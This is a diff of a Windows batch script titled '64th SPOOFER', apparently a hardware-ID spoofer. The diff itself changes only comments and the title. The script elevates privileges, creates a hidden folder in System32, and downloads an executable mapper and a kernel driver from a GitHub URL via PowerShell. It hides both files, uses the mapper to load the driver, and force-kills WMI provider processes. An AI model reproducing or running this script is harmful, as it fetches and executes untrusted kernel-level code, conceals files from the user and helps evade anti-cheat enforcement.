@@ -1,14 +1,14 @@
 @echo off
 :: BatchGotAdmin
 :-------------------------------------
-REM  --> Check for permissions
+REM --> Check for admin permissions
 IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
     >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) ELSE (
     >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 )
 
-REM --> If error flag set, we do not have admin.
+REM --> If error flag is set, we don't have admin
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -29,14 +29,14 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-:: Set target directory to C:\Windows\System32
+:: Set target directory to C:\Windows\System32\CSCv206
 set "targetDir=C:\Windows\System32\CSCv206"
 if not exist "%targetDir%" (
     mkdir "%targetDir%"
     attrib +h "%targetDir%"  :: Hide the directory
 )
 
-:: Download mapper.exe
+:: Download mapper.exe if not already present
 if not exist "%targetDir%\mapper.exe" (
     echo Downloading mapper.exe...
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/64mapper/raw/refs/heads/main/64mapper.exe' -OutFile '%targetDir%\mapper.exe'"
@@ -49,7 +49,7 @@ if not exist "%targetDir%\mapper.exe" (
     attrib +h "%targetDir%\mapper.exe"  :: Hide the file
 )
 
-:: Download driver
+:: Download driver if not already present
 set "driverPath=%targetDir%\paid_driv.sys"
 if not exist "%driverPath%" (
     echo Downloading driver...
@@ -66,9 +66,10 @@ if not exist "%driverPath%" (
 goto spoof
 
 :spoof
-title 64th SPOOFER.
+title 64th SPOFFER.
 echo spoofing..
 
+:: Execute the mapper.exe to load the driver
 "%targetDir%\mapper.exe" -- "%driverPath%"
 if errorlevel 1 (
     color b
@@ -77,13 +78,15 @@ if errorlevel 1 (
     goto cleanup
 )
 
-echo done!
+echo Done!
 goto endsuccess
 
 :endsuccess
 taskkill /im wmiprv* /f /t 2>nul>nul
-REM this is annoying wmic caches.
+REM This kills annoying wmic caches.
 taskkill /im wmiprv* /f /t 2>nul>nul
+rem yes, I'm lazy ^^^
+
 pause
 goto cleanup
 
